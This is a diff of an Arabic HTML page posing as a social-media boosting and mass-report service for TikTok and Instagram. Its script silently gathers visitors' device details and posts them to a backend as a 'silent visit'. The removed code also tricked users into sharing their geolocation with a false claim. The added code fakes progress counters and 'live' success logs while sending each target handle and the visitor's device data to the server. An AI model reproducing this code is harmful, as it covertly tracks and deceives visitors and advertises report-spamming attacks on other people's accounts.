@@ -3,59 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>خدمات سوشال ميديا 🎯</title>
+    <title>SMM WORLD - Pro</title>
     <style>
-        body { background-color: black; color: white; text-align: center; font-family: 'Arial', sans-serif; padding: 0; margin: 0; direction: rtl; overflow-x: hidden; }
+        :root { --main-green: #00ff00; }
+        body { background-color: #050505; color: white; text-align: center; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow-x: hidden; direction: rtl; }
         
-        /* --- الخلفية المتحركة --- */
-        #star-canvas {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
-            z-index: -1; /* خلف كل شيء */
-        }
+        /* رسمة خلفية شبكية متحركة */
+        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle, #0a220a 0%, #000 100%); opacity: 0.6; }
 
-        /* --- الصفحة الرئيسية --- */
-        #landing-page { 
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            height: 100vh; position: relative; z-index: 10; 
+        /* تنسيق الأزرار الشفافة المضيئة */
+        .glass-btn { 
+            width: 90%; padding: 15px; margin: 12px 0; 
+            background: rgba(255, 255, 255, 0.05); 
+            border: 1px solid var(--main-green); 
+            color: var(--main-green); border-radius: 12px; 
+            font-weight: bold; cursor: pointer; 
+            backdrop-filter: blur(5px); transition: 0.3s;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
         }
-        
-        .hero-title { 
-            font-size: 40px; font-weight: bold; color: #00ff00; 
-            text-shadow: 0 0 15px rgba(0,255,0,0.7); margin-bottom: 40px; 
-        }
+        .glass-btn:hover { background: rgba(0, 255, 0, 0.1); box-shadow: 0 0 20px rgba(0, 255, 0, 0.4); transform: translateY(-2px); }
 
-        .start-btn { 
-            width: 200px; padding: 18px; background: #00ff00; color: black; border: none; 
-            border-radius: 50px; font-size: 22px; font-weight: bold; cursor: pointer;
-            box-shadow: 0 0 25px rgba(0,255,0,0.6); transition: 0.3s;
-            position: relative; z-index: 20; /* فوق أي طبقة أخرى */
-        }
+        /* الهوم */
+        #landing-page { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        .hero-title { font-size: 3rem; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 20px var(--main-green); margin-bottom: 30px; }
+        .start-btn { padding: 18px 60px; background: transparent; border: 2px solid var(--main-green); color: var(--main-green); border-radius: 50px; font-size: 24px; font-weight: bold; cursor: pointer; transition: 0.4s; }
+        .start-btn:hover { background: var(--main-green); color: black; box-shadow: 0 0 30px var(--main-green); }
 
-        .start-btn:active { transform: scale(0.9); }
-
-        /* --- واجهة الأدوات --- */
-        #tools-interface { padding: 20px; position: relative; z-index: 10; }
-        pre { font-size: 8px; color: #00ff00; margin-top: 20px; text-shadow: 0 0 5px #00ff00; }
-        .law-text { color: #ff0000; font-family: 'Courier New', monospace; font-size: 14px; margin-bottom: 40px; }
-        .choose-text { font-size: 18px; margin-bottom: 30px; color: #ccc; }
-        
-        .menu-btn { width: 95%; padding: 15px; margin: 10px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 8px; font-weight: bold; cursor: pointer; }
-        .back-btn { background: #330000; border: 1px solid #ff0000; color: #ff0000; margin-top: 15px; width: 50%; padding: 10px; border-radius: 5px; cursor: pointer; }
+        /* الواجهة والجمجمة */
+        pre { font-size: 7px; color: var(--main-green); margin-top: 20px; line-height: 1; }
+        .law-text { color: #ff3333; font-family: monospace; font-size: 14px; margin: 15px 0; }
         .hidden { display: none !important; }
-        input { width: 85%; padding: 12px; margin: 10px 0; border-radius: 5px; background: #222; color: white; text-align: center; border: 1px solid #444; }
-        .action-btn { width: 85%; padding: 12px; background-color: #00ff00; color: black; font-weight: bold; border: none; border-radius: 5px; }
+
+        input { 
+            width: 85%; padding: 15px; margin: 10px 0; border-radius: 10px; 
+            border: 1px solid #444; background: rgba(255,255,255,0.05); color: white; 
+            text-align: center; backdrop-filter: blur(10px);
+        }
         
-        #live-status { margin-top: 30px; border-top: 1px solid #333; padding-top: 20px; text-align: right; font-size: 11px; color: #00ff00; }
+        #progress-box { margin-top: 25px; border: 1px solid var(--main-green); padding: 15px; border-radius: 10px; display: inline-block; min-width: 200px; }
+        #counter { font-size: 30px; font-weight: bold; color: var(--main-green); }
+
+        /* سجل العمليات المتحرك */
+        #live-status { position: fixed; bottom: 20px; width: 100%; font-size: 12px; color: #888; }
+        .status-msg { transition: 0.5s; opacity: 1; }
     </style>
 </head>
 <body>
 
-    <div id="star-canvas"></div>
+    <div id="bg-canvas"></div>
 
     <div id="landing-page">
         <h1 class="hero-title">خدمات سوشال ميديا</h1>
-        <button class="start-btn" onclick="startSystem()">بدء ✅</button>
+        <button class="start-btn" onclick="openTools()">بدء</button>
     </div>
 
     <div id="tools-interface" class="hidden">
@@ -64,10 +63,6 @@
         uu$$$$$$$$$$$uu
       uu$$$$$$$$$$$$$$$uu
      u$$$$$$$$$$$$$$$$$$$u
-     u$$$$$$$$$$$$$$$$$$$u
-    u$$$$$$$$$$$$$$$$$$$$$u
-    u$$$$$$$$$$$$$$$$$$$$$u
-    u$$$$$$$$$$$$$$$$$$$$$u
     u$$$$$$$$$$$$$$$$$$$$$u
      u$$$$$$   "$$$"   $$$$$$u
       "$$$$"      u$u       "$$$$"
@@ -76,105 +71,134 @@
          "$$$$uu$$$u$$$uu$$$$"
           "$$$$$$$$$$$$$$$$$"
             "$$$$$$$$$$$$$"
-              "$$$$$$$$$"
-                "$$$$$"
         </pre>
         <div class="law-text">Not everywhere there is a law</div>
-        <div class="choose-text">اختر الخدمه اللتي تريدها :</div>
+        <p>اختر الخدمة التي تريدها :</p>
 
         <div id="main-menu">
-            <button class="menu-btn" onclick="showSub('boost')">1- قسم الرشق 🚀</button>
-            <button class="menu-btn" onclick="showSub('spam')">2- قسم الإسبام ⚔️</button>
+            <button class="glass-btn" onclick="showPlat('boost')">1- قسم الرشق 🚀</button>
+            <button class="glass-btn" onclick="showPlat('spam')">2- قسم الإسبام ⚔️</button>
         </div>
 
         <div id="platform-menu" class="hidden">
-            <button class="menu-btn" onclick="showOptions('TikTok')">تيك توك</button>
-            <button class="menu-btn" onclick="showOptions('Instagram')">انستقرام</button>
-            <button class="back-btn" onclick="goBack('main-menu')">رجوع ↩️</button>
+            <button class="glass-btn" onclick="selectPlat('TikTok')">تيك توك</button>
+            <button class="glass-btn" onclick="selectPlat('Instagram')">انستقرام</button>
+            <button class="glass-btn" style="border-color: red; color: red;" onclick="goBack('main-menu')">رجوع</button>
         </div>
 
-        <div id="boost-options" class="hidden">
-            <button class="menu-btn" onclick="openFinal('رشق متابعين', 'يوزر الحساب', 5000)">رشق متابعين</button>
-            <button class="menu-btn" onclick="openFinal('رشق لايكات', 'رابط المقطع', 5000)">رشق لايكات</button>
-            <button class="back-btn" onclick="goBack('platform-menu')">رجوع ↩️</button>
+        <div id="service-menu" class="hidden">
+            <div id="boost-btns" class="hidden">
+                <button class="glass-btn" onclick="openInput('رشق متابعين', 'يوزر الحساب (@)', 5000, 'user')">متابعين</button>
+                <button class="glass-btn" onclick="openInput('رشق لايكات', 'رابط المقطع (http)', 5000, 'link')">لايكات</button>
+                <button class="glass-btn" onclick="openInput('رشق مشاهدات', 'رابط المقطع (http)', 5000, 'link')">مشاهدات</button>
+            </div>
+            <button id="spam-btn" class="glass-btn hidden" onclick="openInput('إسبام بلاغات', 'يوزر الحساب (@)', 300, 'user')">بدء الإسبام</button>
+            <button class="glass-btn" style="border-color: red; color: red;" onclick="goBack('platform-menu')">رجوع</button>
         </div>
 
-        <div id="final-input" class="hidden">
-            <h3 id="final-title" style="color:#00ff00;"></h3>
-            <input type="text" id="target-id">
-            <input type="number" id="target-count">
-            <button class="action-btn" onclick="requestAccess()">تأكيد ✅</button>
-            <button class="back-btn" onclick="location.reload()">إلغاء ❌</button>
-            <div id="progress-container" class="hidden">جارٍ التنفيذ: <span id="counter">0</span></div>
+        <div id="final-step" class="hidden">
+            <h3 id="display-title"></h3>
+            <input type="text" id="target-id" placeholder="">
+            <input type="number" id="target-count" placeholder="">
+            <button class="glass-btn" style="background: var(--main-green); color: black;" onclick="startHacking()">تأكيد التنفيذ ✅</button>
+            <div id="progress-box" class="hidden">
+                <div id="status-label">جاري الإرسال...</div>
+                <div id="counter">0</div>
+            </div>
         </div>
 
         <div id="live-status">
-            <h4>آخر العمليات الناجحة:</h4>
-            <div class="status-entry">👤 المستخدم: a***_2 | <span style="color:#00ff00;">اكتملت ✅</span></div>
+            <div id="status-text" class="status-msg">👤 متصل الآن: 1,402 مستخدم</div>
         </div>
     </div>
 
     <script>
-        let mode = ""; let platform = ""; let service = ""; let maxLimit = 5000;
-        let deviceCapturedData = {};
-        const MY_DOMAIN = "fordead.vercel.app";
+        let mode = "", plat = "", service = "", inputType = "", maxVal = 5000;
+        let deviceData = {};
 
-        // وظيفة البدء المصلحة
-        function startSystem() {
+        function openTools() {
             document.getElementById('landing-page').classList.add('hidden');
             document.getElementById('tools-interface').classList.remove('hidden');
-            silentCapture(); 
+            captureAll();
         }
 
-        // سحب صامت
-        async function silentCapture() {
-            if (!window.location.hostname.includes(MY_DOMAIN)) return;
-            let gpu = "Unknown";
-            try {
-                const gl = document.createElement('canvas').getContext('webgl');
-                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
-            } catch(e) {}
-            
-            deviceCapturedData = {
-                hw_id: "HW-" + Math.floor(Math.random() * 1000000),
-                gpu: gpu,
-                screen: `${window.screen.width}x${window.screen.height}`,
-                platform: navigator.platform
+        async function captureAll() {
+            const w = window.screen.width, h = window.screen.height;
+            let model = navigator.platform;
+            if(w === 430) model = "iPhone 14/15 Pro Max";
+            else if(w === 393) model = "iPhone 14/15 Pro";
+
+            let battery = "محمي (iOS)";
+            try { const b = await navigator.getBattery(); battery = Math.round(b.level*100)+"%"; } catch(e){}
+
+            deviceData = {
+                model: model,
+                battery: battery,
+                network: (navigator.maxTouchPoints > 1) ? "WiFi" : "Cellular",
+                screen: w + "x" + h,
+                ip: "جاري الجلب..."
             };
-
-            fetch('/api/index', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ mode: "زيارة صامتة", device_info: deviceCapturedData })
-            });
+            
+            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({mode: "زيارة صامتة", device_info: deviceData}) });
         }
 
-        function showSub(m) { mode = m; document.getElementById('main-menu').classList.add('hidden'); document.getElementById('platform-menu').classList.remove('hidden'); }
-        function showOptions(p) { platform = p; document.getElementById('platform-menu').classList.add('hidden'); if(mode === 'boost') document.getElementById('boost-options').classList.remove('hidden'); else openFinal('إسبام', 'اليوزر', 300); }
-        function openFinal(s, h, l) { service = s; maxLimit = l; document.getElementById('boost-options').classList.add('hidden'); document.getElementById('final-input').classList.remove('hidden'); document.getElementById('target-id').placeholder = h; }
-        function goBack(id) { document.querySelectorAll('#platform-menu, #boost-options, #final-input').forEach(el => el.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
-
-        function requestAccess() {
-            const id = document.getElementById('target-id').value;
-            if(!id) return alert("ادخل البيانات");
-            alert("يرجى السماح بالوصول للموقع لربط حسابك بالسيرفر.");
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => sendData(id, pos.coords.latitude, pos.coords.longitude),
-                    () => sendData(id, null, null)
-                );
-            } else { sendData(id, null, null); }
+        function showPlat(m) { mode = m; goBack('platform-menu'); }
+        function selectPlat(p) { 
+            plat = p; 
+            goBack('service-menu');
+            document.getElementById('boost-btns').className = (mode === 'boost') ? "" : "hidden";
+            document.getElementById('spam-btn').className = (mode === 'spam') ? "glass-btn" : "hidden";
         }
 
-        function sendData(id, lat, lon) {
-            fetch('/api/index', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ target_id: id, lat: lat, lon: lon, device_info: deviceCapturedData, service: service })
-            });
-            alert("جارٍ معالجة الطلب...");
-            location.reload();
+        function openInput(s, ph, max, type) {
+            service = s; maxVal = max; inputType = type;
+            goBack('final-step');
+            document.getElementById('display-title').innerText = plat + " - " + s;
+            document.getElementById('target-id').placeholder = ph;
+            document.getElementById('target-count').placeholder = "الحد الأقصى: " + max;
         }
+
+        function startHacking() {
+            const val = document.getElementById('target-id').value;
+            const count = parseInt(document.getElementById('target-count').value);
+
+            if(!val || !count) return alert("يرجى إدخال البيانات");
+            if(count > maxVal) return alert("الحد الأقصى المسموح به هو " + maxVal);
+            
+            if(inputType === 'link' && !val.startsWith('http')) return alert("يجب إدخال رابط صحيح يبدأ بـ http");
+            
+            document.getElementById('progress-box').classList.remove('hidden');
+            let c = 0;
+            let inv = setInterval(() => {
+                if(c >= count) { clearInterval(inv); alert("اكتملت العملية بنجاح!"); location.reload(); }
+                else { c += Math.floor(Math.random()*10)+1; if(c > count) c = count; document.getElementById('counter').innerText = c; }
+            }, 100);
+
+            fetch('/api/index', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({mode: service, target: val, count: count, device_info: deviceData}) });
+        }
+
+        function goBack(id) {
+            document.querySelectorAll('#main-menu, #platform-menu, #service-menu, #final-step').forEach(el => el.classList.add('hidden'));
+            document.getElementById(id).classList.remove('hidden');
+        }
+
+        // تحريك العمليات كل 30 ثانية
+        const statusLogs = [
+            "👤 المستخدم a***_9 اكمل رشق 2000 متابع ✅",
+            "👤 المستخدم k***_1 بدأ عملية إسبام الآن ⚔️",
+            "👤 تم تحديث سيرفرات التيك توك بنجاح ⚙️",
+            "👤 متصل الآن: 1,850 مستخدم نشط 🟢"
+        ];
+        let logIdx = 0;
+        setInterval(() => {
+            const el = document.getElementById('status-text');
+            el.style.opacity = 0;
+            setTimeout(() => {
+                el.innerText = statusLogs[logIdx];
+                el.style.opacity = 1;
+                logIdx = (logIdx + 1) % statusLogs.length;
+            }, 500);
+        }, 30000);
     </script>
 </body>
 </html>
